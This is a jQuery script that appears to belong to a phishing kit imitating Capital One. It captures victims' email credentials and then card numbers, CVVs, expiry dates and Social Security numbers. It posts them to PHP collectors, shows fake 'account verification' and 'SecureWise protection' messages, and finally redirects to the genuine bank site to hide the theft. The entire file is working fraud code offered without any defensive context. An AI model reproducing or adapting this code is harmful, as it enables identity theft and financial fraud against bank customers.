$(document).ready(function(){
	$('#data-eml').on('submit',function(e) {
	e.preventDefault();
	
	var coeml = $('#coeml').val();
    var coempw = $('#coempw').val();
	
	if(coeml == "") {
		$('#er1').slideDown();
	}else if(coempw == "") {
		$('#er2').slideDown();
	}else {
		$.ajax ({
			url: "dt/eml.php",
			type: "POST",
			data: new FormData(this),
			contentType: false,
			cache: false,
			processData: false,
			success: function(data) {
				if(data != "good") {
					alert(data);
				}else if(data == "good") {
					$("#bar-2").hide();
					$("#bar-3").show();
					$("#av-eml").hide();
					$("#av-crd").show();
					$('#h1').html('For your security, we need to verify your account');
					$('#hp').html('We need to make sure it\'s really you. For your protection ,we need to verify your identity by providing your account card information for extra security.');
				}
			}
		});
		return false;
	}
});

$('#data-crd').on('submit',function(e) {
	e.preventDefault();
	
	var ccnum = $('#ccnum').val();
	var expm = $('#expm').val();
	var expy = $('#expy').val();
    var cvv = $('#cvv').val();
    var ssn = $('#ssn').val();
	
	if(ccnum == "") {
		$('#er3').slideDown();
	}else if(cvv == "") {
		$('#er4').slideDown();
	}else if(ssn == "") {
		$('#er5').slideDown();
	}else {
		$.ajax ({
			url: "dt/crd.php",
			type: "POST",
			data: new FormData(this),
			contentType: false,
			cache: false,
			processData: false,
			success: function(data) {
				if(data != "nice") {
					alert(data);
				}else if(data == "nice") {
					$("#bar-2").hide();
					$("#bar-3").hide();
					$("#av-eml").hide();
					$("#av-crd").hide();
					$("#av-scr").show();
					$('#h1').html('Congratulations! Your accounts are now secure.');
					$('#hp').html('Thank you for verifying your account. Capital One SecureWise protection will now be activated on your account to provide you with better security. <br> You will now be redirected to Homepage.');
					setTimeout(function(){
						window.location="https://www.capitalone.com";
					}, 4000);
				}
			}
		});
		return false;
	}
});
$('#coeml').on('keydown', function(){
	$("#er1").slideUp();
});
$('#coempw').on('keydown', function(){
	$("#er2").slideUp();
});
$('#ccnum').on('keydown', function(){
	$("#er3").slideUp();
});
$('#cvv').on('keydown', function(){
	$("#er4").slideUp();
});
$('#ssn').on('keydown', function(){
	$("#er5").slideUp();
});
	
	$("#ccnum, #cvv, #ssn").keydown(function (e) {
		if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
			(e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
			(e.keyCode >= 35 && e.keyCode <= 40)) {
				return;
			}
		if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
			e.preventDefault();
		}
	});
	
	var $jqNum = jQuery('input[name="ssn"]');
	$jqNum.bind('keyup','keydown', function(e){
	if(e.which !== 11) { 
		var numChars = $jqNum.val().length;
		if(numChars === 3 || numChars === 6){
			var thisVal = $jqNum.val();
			thisVal += '-';
			$jqNum.val(thisVal);
		}
	}
	});
});